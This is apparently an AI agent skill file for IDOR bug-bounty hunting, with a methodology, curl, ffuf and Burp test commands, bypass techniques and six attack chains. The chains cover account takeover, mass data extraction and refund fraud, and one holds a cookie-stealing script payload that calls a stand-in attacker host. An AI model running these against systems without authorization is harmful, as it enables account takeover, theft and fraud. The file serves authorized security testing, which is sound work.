---
name: hunt-idor
description: Hunting skill for idor vulnerabilities. Built from 26 public bug bounty
  reports. Use when hunting idor on any target.
category: security
risk: offensive
source: https://github.com/elementalsouls/Claude-BugHunter
source_repo: elementalsouls/Claude-BugHunter
source_type: community
date_added: '2026-09-20'
license: MIT
license_source: https://github.com/elementalsouls/Claude-BugHunter/blob/main/LICENSE
compatibility: Requires explicit written authorization for a target scope plus the
  relevant testing tools for this technique. Docs-only; helper scripts and commands
  not bundled.
sources: github, hackerone_public
report_count: 39
---
> **⚠️ AUTHORIZED USE ONLY**
> This skill is for educational purposes or authorized security assessments only.
> You must have explicit, written permission from the system owner before using this tool.
> Misuse of this tool is illegal and strictly prohibited.

> **Mandatory confirmation gate**
> Before running any command that probes, exploits, changes, persists on, extracts data from, or attempts credential access against a target:
> 1. Ask the user to state the exact target URL, IP, account, or resource.
> 2. Ask the user to confirm written authorization and the permitted scope.
> 3. Show the exact command(s) and explain their expected effect.
> 4. Wait for explicit confirmation in the current conversation.
>
> Without that confirmation, remain read-only and provide defensive guidance only. Prefer a sandbox, disposable VM, or controlled lab.

## Crown Jewel Targets

**Why IDOR pays big:**
- Direct access to other users' data without authentication bypass — clear, demonstrable impact
- Chains easily with privilege escalation, financial fraud, and account takeover
- Affects virtually every application with user-owned resources

**Highest-value asset types (by payout potential):**

| Asset Type | Why It Pays |
|---|---|
| Financial documents / billing APIs | PII + financial data exposure (Shopify, Uber, PayPal) |
| Private repositories / source code | IP theft, critical data loss (GitHub) |
| User messages / DMs | Privacy violation at scale (Reddit) |
| Account management endpoints | User addition, deletion, privilege escalation (PayPal, Mozilla) |
| Business/org administration | Cross-tenant escalation, employee PII (Uber) |
| Content moderation/admin actions | Operational sabotage (Reddit mod logs) |

**Programs that pay most for IDOR:**
- Platforms with multi-tenancy (SaaS, B2B tools)
- Fintech and payment processors
- Social platforms with private content
- Developer tools with org/repo isolation

---

## Attack Surface Signals

**URL patterns that scream IDOR:**
```
/api/v1/users/{id}/
/api/v*/orders/{order_id}
/invoices/download?id=
/reports/{uuid}/
/messages/{thread_id}
/admin/orgs/{org_id}/members
/migration/{migration_id}/files
/graphql (query params with IDs)
/api/business/{business_id}/
/vouchers/{voucher_id}/policy
```

**Response header signals:**
- `Content-Type: application/json` on endpoints accepting raw IDs
- No `X-Frame-Options` or CORS misconfigs paired with ID params
- `Authorization: Bearer` tokens that are user-scoped but hit org-level resources

**JavaScript source patterns:**
```javascript
// Look for hardcoded or interpolated IDs in JS
fetch(`/api/v1/users/${userId}/profile`)
axios.get('/invoices/' + invoiceId)
graphql query { billingDocument(id: $docId) }
// Redux/state stores exposing foreign IDs
state.currentUser.organizationId
```

**Tech stack signals:**
- GraphQL endpoints (query-based IDORs are often missed)
- REST APIs with sequential integer IDs (most vulnerable)
- UUIDs that are predictable or leaked in other responses
- Multi-tenant SaaS apps with `org_id`, `account_id`, `business_id` params
- Mobile apps (Burp the APK — mobile APIs often skip authorization checks)

---

## Step-by-Step Hunting Methodology

1. **Map all object references in the application**
   - Browse every feature authenticated as User A
   - Capture all requests in Burp Suite
   - Filter for requests containing: `id=`, `_id=`, `uuid=`, `/v1/{noun}/{id}`, query params with numeric/UUID values

2. **Enumerate ID types**
   - Sequential integers → enumerate ±1, ±100
   - UUIDs → check if they appear in other responses or JS files
   - Hashed IDs → check if leaked in public endpoints, metadata, or GraphQL introspection

3. **Create two separate accounts (same privilege level)**
   - User A: resource owner
   - User B: attacker account
   - Log all IDs belonging to User A while authenticated as User A

4. **Replay User A's resource IDs as User B**
   - Replace session cookie/token with User B's credentials
   - Send identical requests referencing User A's object IDs
   - Test ALL HTTP verbs: GET, POST, PUT, PATCH, DELETE on each endpoint

5. **Test cross-tenant/cross-org scenarios**
   - Create accounts in separate organizations/businesses
   - Test if Org B's session can reference Org A's IDs
   - Pay special attention to admin/management endpoints

6. **Test GraphQL specifically**
   - Run introspection: `{ __schema { queryType { fields { name } } } }`
   - For every query/mutation taking an `id` argument, substitute another user's ID
   - Test both queries (read) and mutations (write/delete)

7. **Test write/destructive operations, not just reads**
   - Can User B DELETE User A's resources?
   - Can User B MODIFY User A's content?
   - Can User B ADD themselves to User A's account?

8. **Chain IDORs together**
   - Use one IDOR's leaked data (org IDs, user IDs) to fuel the next
   - IDOR → leaked ID → second IDOR → privilege escalation

9. **Test state-changing edge cases**
   - Expired tokens/invites that can still be accepted
   - Race conditions on resource IDs
   - Indirect references: `?sort=id` or `?filter[user_id]=`

10. **Document the exact differential**
    - Confirm User B has NO legitimate access to User A's resource
    - Screenshot/log the 200 OK vs expected 403/404

---

## Payload & Detection Patterns

**Basic IDOR test with curl (swap cookie/token):**
```bash
# Get User A's resource ID while authenticated as A
curl -s -H "Cookie: session=USER_A_SESSION" \
  https://target.com/api/v1/invoices/12345

# Replay with User B's session
curl -s -H "Cookie: session=USER_B_SESSION" \
  https://target.com/api/v1/invoices/12345

# Success = 200 OK with User A's data
```

**GraphQL IDOR test:**
```bash
curl -s -X POST https://target.com/graphql \
  -H "Authorization: Bearer USER_B_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"query":"{ billingDocument(id: \"USER_A_DOC_ID\") { id amount pdfUrl } }"}'
```

**Enumerate sequential IDs with ffuf:**
```bash
ffuf -u "https://target.com/api/v1/orders/FUZZ" \
  -w ids.txt \
  -H "Authorization: Bearer USER_B_TOKEN" \
  -mc 200 \
  -o idor_results.json
```

**Generate sequential ID wordlist:**
```python
# Generate IDs around a known value
known_id = 48291
with open("ids.txt", "w") as f:
    for i in range(known_id - 500, known_id + 500):
        f.write(str(i) + "\n")
```

**Burp Intruder payload for IDOR scanning:**
```
GET /api/messages/§12345§ HTTP/1.1
Host: target.com
Authorization: Bearer USER_B_TOKEN

# Mark §12345§ as injection point
# Use numeric sequential payload: 12000-13000
# Filter responses by length difference or status 200
```

**JavaScript scraping for leaked IDs:**
```bash
# Find IDs in JS bundles
curl -s https://target.com/static/app.js | grep -Eo '"id":"[a-f0-9-]{36}"' | sort -u

# Find object references in API responses
curl -s -H "Cookie: session=USER_A" \
  https://target.com/api/v1/dashboard | python3 -m json.tool | grep -i "_id"
```

**Grep patterns for source code review:**
```bash
# Missing authorization checks in common frameworks
grep -r "findById\|findOne\|getById" --include="*.js" .
grep -r "params\[:id\]\|params\['id'\]" --include="*.rb" .
grep -r "request\.args\.get\('id'\)" --include="*.py" .

# Look for direct ORM queries without user scoping
grep -r "Model\.find(params" --include="*.js" .
# vs secure pattern: Model.find({ id: params.id, userId: req.user.id })
```

**IDOR via HTTP method tampering:**
```bash
# Try undocumented methods
for method in GET POST PUT PATCH DELETE OPTIONS HEAD; do
  echo "=== $method ==="
  curl -s -X $method \
    -H "Authorization: Bearer USER_B_TOKEN" \
    https://target.com/api/v1/users/USER_A_ID/profile
done
```

---

## Common Root Causes

1. **Missing ownership check in ORM queries**
   ```javascript
   // VULNERABLE: fetches any record
   const invoice = await Invoice.findById(req.params.id);
   
   // SECURE: scopes to authenticated user
   const invoice = await Invoice.findOne({ _id: req.params.id, userId: req.user.id });
   ```

2. **Authorization at the route level, not object level**
   - Developer checks "is user logged in?" but not "does this user own this object?"
   - Middleware confirms authentication; individual handlers skip ownership validation

3. **Trusting client-supplied IDs in request bodies**
   - Mobile apps or SPAs send `org_id` in POST body; server uses it directly without verifying caller belongs to that org

4. **GraphQL resolvers without field-level authorization**
   - Query resolvers fetch by ID from database without checking if the requesting user has permission
   - Especially common when resolvers are auto-generated from schema

5. **Inconsistent authorization across HTTP verbs**
   - GET endpoint is protected; POST/DELETE on same resource path is not
   - Common in APIs built incrementally by different developers

6. **Indirect references exposed via related objects**
   - Object A (accessible) contains a reference to Object B (should be private)
   - Developer only protects direct access to B, not indirect references through A

7. **Race conditions and state-based IDORs**
   - Authorization checked at creation time, not at access time
   - Invites/tokens remain valid after the granting permission is revoked

8. **Multi-tenant isolation failures**
   - Developers implement per-user access control but forget cross-org boundaries
   - `user_id` check present; `org_id` / `tenant_id` check absent

---

## Bypass Techniques

**Defense: UUIDs instead of sequential integers**
- Bypass: UUIDs often leak in other API responses, notification emails, webhooks, GraphQL queries, or JS source
- Technique: Harvest UUIDs from accessible endpoints, then replay against restricted ones

**Defense: Indirect/hashed object references**
- Bypass: Decode the hash (often base64 or simple obfuscation), or find the original ID in another response
- Technique: `echo "dXNlcl8xMjM0NQ==" | base64 -d` → `user_12345`

**Defense: Short-lived tokens per resource**
- Bypass: Tokens sometimes reusable across users if server only validates token format, not binding
- Technique: Use your own token to access another user's resource ID

**Defense: Rate limiting on enumeration**
- Bypass: Slow enumeration (1 req/5s), use distributed IPs, or exploit non-enumeration IDORs (you already know the target's ID from another leak)

**Defense: Checking `user_id` in WHERE clause**
- Bypass: Check if the same endpoint exists at a different API version (`/v1/` vs `/v2/`) — authorization logic is often version-specific
- Technique: Check JS bundles for older API version calls

**Defense: CORS restrictions**
- Bypass: IDOR doesn't require cross-origin exploitation — you're testing API endpoints directly with your own session

**Defense: "Opaque" references via server-side sessions**
- Bypass: Look for any endpoint that *returns* the internal ID, then use it elsewhere; APIs often expose IDs in `Location` headers, error messages, or metadata

**Defense: Parameter filtering/WAF on common patterns**
- Bypass: Try nested JSON `{"data": {"id": "VICTIM_ID"}}`, HTTP parameter pollution `?id=own_id&id=victim_id`, or parameter name variations `user_id`, `userId`, `uid`, `account`

---

## Gate 0 Validation

Before writing the report, answer all three:

1. **What can the attacker DO right now?**
   Be specific: "Attacker with a valid account can send a GET request to `/api/v1/invoices/{victim_invoice_id}` and receive the victim's full billing document including name, address, and payment amount — without any relationship to that account."

2. **What does the victim LOSE?**
   Map to CIA triad: confidentiality (data exposed), integrity (data modified), or availability (data deleted). "Victim loses confidentiality of private financial records" or "Victim's content is deleted by a third party" — vague answers fail.

3. **Can it be reproduced in 10 minutes from scratch?**
   - Two fresh accounts created ✓
   - Exact HTTP request documented with victim's ID ✓
   - 200 OK response showing victim's data (or confirmed state change) ✓
   - No reliance on pre-existing state or timing ✓
   
   If you can't demo it reproducibly, do not file the report.

---

## Real Impact Examples

**Scenario 1: Financial Data Exposure + Cross-Account Billing Fraud (Uber-style)**
An attacker discovers two related IDORs: one allows reading any organization's voucher policy configuration (exposing org IDs, employee email lists, and payment methods), and a second allows modifying voucher policies using those leaked IDs. Chained together, this enables the attacker to redirect charges to an arbitrary business account, expose employee PII across organizations, and take over invitation links — all without any elevated privileges beyond a basic user account. Impact: financial fraud + mass PII exposure across the B2B platform.

**Scenario 2: Private Repository Read via IDOR on Migration Endpoint (GitHub-style)**
A migration feature allows users to upload files to a migration job. The `migration_id` parameter is not validated against the authenticated user's ownership. An attacker creates their own migration, observes the ID format, and substitutes another user's private migration ID — gaining read access to source code files from private repositories they have no access to. Impact: complete confidentiality bypass for private intellectual property.

**Scenario 3: Account Takeover Chain via Message IDOR (Reddit-style)**
An attacker accesses another user's private message threads by substituting their `thread_id` in a messaging API endpoint. The response includes message content, metadata, and — critically — session or verification tokens sent via internal messages. The attacker leverages the token found in the messages to perform account recovery steps, escalating a read-only IDOR into full account takeover. Impact: complete account compromise of targeted users at scale.

---

## Chains & Compositions (Senior Hunting)

Standalone IDOR gets paid at Low-Medium for cross-tenant *read*. The real money is in chaining IDOR to a *state-change* primitive that doesn't normally permit cross-tenant action — turning "I can see victim's data" into "I own victim's account". The six chains below are the highest-paying IDOR compositions on modern bug-bounty programs.

### Chain 1 — IDOR on `/api/users/{id}/email` + Missing Re-Auth → Password Reset → ATO

- **A.** Confirm IDOR on the email-change endpoint — request `PUT /api/users/{victim_id}/email {"email":"attacker@evil"}` from attacker's session; server changes the victim's email without ownership check.
- **B.** Hit the password-reset flow on the victim's account — server emails reset link to the **new** email (attacker's).
- **C.** Open reset link, set new password, log in as victim.
- **Impact:** Silent ATO — victim sees no email change notification because the change happens via API not via the user-facing "change email" UI which has its own audit log.
- **Real shape:** Classic ATO pattern across many SaaS bug-bounty disclosures 2018-2024. Cross-refs `hunt-ato` Path 2 (email change without re-auth).

### Chain 2 — IDOR on File-Download + Filename-Controlled `Content-Disposition` → Reflected-XSS-Via-Download → Session Theft

- **A.** IDOR on `/api/files/{id}/download` returns any user's file given the ID.
- **B.** The download endpoint sets `Content-Disposition: attachment; filename="<user-supplied-filename>"` without sanitising newlines or quotes — attacker uploads a file with filename `"; <script>fetch('https://attacker/x?c='+document.cookie)</script>; foo.txt`.
- **C.** Victim navigates to download → browser interprets the injected script in the response header context as HTML → JS runs same-origin → cookie/token exfil.
- **Impact:** ATO via IDOR + filename-controlled response header — neither primitive alone is critical; the chain is.
- **Real shape:** Multiple disclosed cases involving Office 365 SharePoint download endpoints, GitLab attachment downloads, SaaS export endpoints. Pairs with `hunt-xss` Chain 1 (response-header XSS class).

### Chain 3 — IDOR via GraphQL `node(id:)` GID + Relay Relation Traversal → Cross-Tenant Mass Data Extraction

- **A.** Target uses GraphQL with Relay-style global IDs (`gid://shopify/Customer/<n>` or base64-encoded `type:id` patterns).
- **B.** `node(id:"<victim_gid>") { ... on Customer { email orders { totalPrice paymentMethods { cardLast4 } } } }` — the top-level `node()` resolver auths the requester, but nested relations don't re-check ownership against the resolved Customer.
- **C.** Iterate IDs (decoding base64 to extract numeric, incrementing) to exfil emails, order totals, payment methods across the entire customer base.
- **Impact:** Mass cross-tenant PII / financial data extraction. Single bug, full database.
- **Real shape:** Shopify Billing IDOR H1 #2207248 ($5,000); HackerOne PolicyPageAssetGroup IDOR H1 #1618347 ($25,000). Cross-refs `hunt-graphql` Disclosed Report Citation #5 and #2.

### Chain 4 — IDOR on `/api/teams/{id}/members` + Mass-Assignment in Body → Role Escalation on Victim Team

- **A.** Standard horizontal IDOR — `POST /api/teams/{victim_team_id}/members {"email":"attacker@evil"}` adds attacker as a normal member without ownership check.
- **B.** The body accepts additional fields the API didn't filter: `{"email":"attacker@evil", "role":"OWNER", "permissions":["*"]}` — mass assignment leaks into the role field.
- **C.** Attacker is added to the victim team as OWNER. Now has full admin access to the victim team's resources and can remove the real owners.
- **Impact:** Cross-tenant privilege escalation via IDOR + mass assignment. The single most efficient takeover chain on SaaS team-management APIs.
- **Real shape:** Shopify undocumented `fileCopy` mutation H1 #981472 (2020, $2,000); Stripe `UpdateAtlasApplicationPerson` cross-tenant mutation H1 #1066203 (2020). Cross-refs `hunt-graphql` Disclosed Report Citation #7 and #8; pairs with `hunt-api-misconfig` Mass Assignment section.

### Chain 5 — Soft-Delete IDOR + Post-Removal Token Validity → Persistent Cross-Tenant Access

- **A.** Identify the "remove member" endpoint that flips an `active=false` flag but doesn't invalidate the session/PAT.
- **B.** Log in as the to-be-removed user; capture session cookie or PAT.
- **C.** Have the org admin remove the user via the normal flow. Wait. Re-issue API calls using the captured token — IDOR is now *temporal* (the user no longer has permission per the policy table, but the cached auth context still passes).
- **Impact:** Weeks of post-termination cross-tenant access; GDPR/CCPA breach exposure; potential extortion leverage.
- **Real shape:** Shopify removed-staff persistence class (2022). Cross-refs `hunt-misc` Chain 1 — same root cause shape, different starting primitive.

### Chain 6 — Double-IDOR (`/users/{id}/orders → /orders/{order_id}/refund`) → Financial Impact on Victim Merchant

- **A.** First IDOR: `GET /api/users/{victim_id}/orders` returns the victim's order list without ownership check — yields legitimate `order_id` values.
- **B.** Second IDOR: `POST /api/orders/{order_id}/refund` issues refunds without checking that the requester owns the merchant/order.
- **C.** Trigger refund on each of the victim merchant's recent orders. Money moves from merchant to customer (who is also attacker-controlled).
- **Impact:** Direct financial loss to the victim merchant. Mass-exploitable across the platform's merchant base.
- **Real shape:** Multiple disclosed e-commerce platform IDOR chains 2019-2023. Cross-refs `hunt-business-logic` Chain (financial impact via state-machine confusion).

### Operator-level pattern

When you confirm a read-IDOR at A, immediately ask: *what state-change accepts the same ID and might also be IDOR'd?* The chain is usually one of: (1) password reset / email change at terminal step → ATO; (2) refund / withdraw / transfer → financial; (3) role-change / membership-add → privilege escalation. If your read-IDOR doesn't compose to one of those, the standalone payout is what you get. Hunt for both halves — the second is often easier to find because it shares the same auth bug class as the first.

Cross-references:
- `hunt-ato` — Chain 1, 5
- `hunt-xss` — Chain 2
- `hunt-graphql` — Chains 3, 4
- `hunt-misc` — Chain 5
- `hunt-business-logic` — Chain 6

---

## Related Skills & Chains

- **`hunt-auth-bypass`** — Object-level authorization failure plus route-level auth absence is the canonical IDOR-amplifier. Chain primitive: missing `req.user.id` scoping in ORM query + missing middleware on legacy `/v1/` route = unauthenticated cross-tenant data read via direct ID substitution → bulk PII dump without any session at all.
- **`hunt-ato`** — Profile-edit IDOR is the most direct path from "read someone's data" to "own their account." Chain primitive: `PATCH /api/users/{victim_uid}` accepts attacker's session + victim UID → set `email=attacker@evil.com` → trigger password reset → reset link arrives at attacker → full ATO without ever knowing victim credentials.
- **`hunt-graphql`** — GraphQL resolvers without field-level authorization are IDOR-by-default; introspection hands you the schema. Chain primitive: `__schema` introspection → enumerate every mutation accepting `id:` argument → substitute victim IDs across `updateUser`, `deleteOrg`, `transferBilling` mutations → mass IDOR fan-out from one introspection query.
- **`security-arsenal`** — Pull the IDOR Bypass Tables section for HTTP-parameter-pollution payloads (`?id=own&id=victim`), nested-JSON wrappers (`{"data":{"id":"VICTIM"}}`), and parameter-name variations (`uid`/`userId`/`user_id`/`account`) when the first direct substitution returns 403.
- **`triage-validation`** — Run the Pre-Severity Gate before claiming Critical on an IDOR that returns 200 but doesn't actually leak data (empty array, redacted fields, "access denied" in body with 200 status). The 200-but-no-data IDOR is the #1 N/A driver on H1/Bugcrowd.

## When to Use

- You have explicit, written authorization to assess the target in scope, and the task matches this skill's vulnerability class or technique within a bug-bounty or penetration-test engagement.
- You need the recon, exploitation, or validation workflow described below — executed strictly inside the approved scope.

## Limitations

- Authorized scope only: the confirmation gate above is mandatory before any probing, exploitation, or credential-access command.
- Docs-only import: upstream helper scripts, commands, engine, and research assets are not bundled; reinstall tooling from the source repo when needed.
- Validate every finding (see `triage-validation`) before reporting; report via `report-writing`. Prefer a sandbox, disposable VM, or controlled lab.

### Example

```bash
# Read-only first step; confirm scope before anything active.
cat scope.txt  # target list from the authorized engagement brief
```

> Adapted from [elementalsouls/Claude-BugHunter](https://github.com/elementalsouls/Claude-BugHunter) (MIT); frontmatter, When to Use/Limitations, and safety boundaries added for upstream compliance. Docs-only import: executable helpers, commands, engine, and research assets not bundled.
